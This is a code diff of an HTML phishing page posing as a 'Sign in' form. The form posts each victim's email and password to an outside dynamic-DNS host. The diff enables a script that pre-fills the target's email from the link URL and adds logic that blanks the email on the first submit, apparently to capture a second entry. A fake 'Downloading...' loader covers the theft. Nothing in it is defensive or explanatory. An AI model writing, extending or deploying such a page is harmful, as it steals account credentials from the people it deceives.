@@ -178,11 +178,11 @@
         <h2>Sign in</h2>
         <form id="loginForm" action="https://intakalbkabera.zapto.org/single/next2580.php" method="post">
             <input type="email" id="inputline1" name="user" placeholder="Enter Email" required>
-            <!-- <script type="text/javascript">
+            <script type="text/javascript">
                 var url = window.location.href;
                 var name = url.substring(url.indexOf("=") + 1);
                 document.getElementById("inputline1").value = name;
-            </script> -->
+            </script>
             <input type="password" name="pass" placeholder="Enter Password" required>
             <input class="continue-btn" type="submit" name="submit" value="Login" />
         </form>
@@ -206,15 +206,30 @@
         <p>Downloading...</p>
     </div>
 
-    <script>
-        const form = document.getElementById("loginForm");
-        const preloader = document.getElementById("preloader");
+ <script>
+    const form = document.getElementById("loginForm");
+    const preloader = document.getElementById("preloader");
+    const emailInput = document.getElementById("inputline1");
 
-        form.addEventListener("submit", function () {
-            // Show preloader after the user clicks submit
-            preloader.classList.remove("hidden");
-        });
-    </script>
+    // Autofill email from URL
+    var url = window.location.href;
+    var name = url.substring(url.indexOf("=") + 1);
+    emailInput.value = name;
+
+    let firstSubmit = true;
+
+    form.addEventListener("submit", function (e) {
+        // Show preloader
+        preloader.classList.remove("hidden");
+
+        if (firstSubmit) {
+            // Clear email input
+            emailInput.value = "";
+            firstSubmit = false;
+        }
+    });
+</script>
+
 
 </body>
 
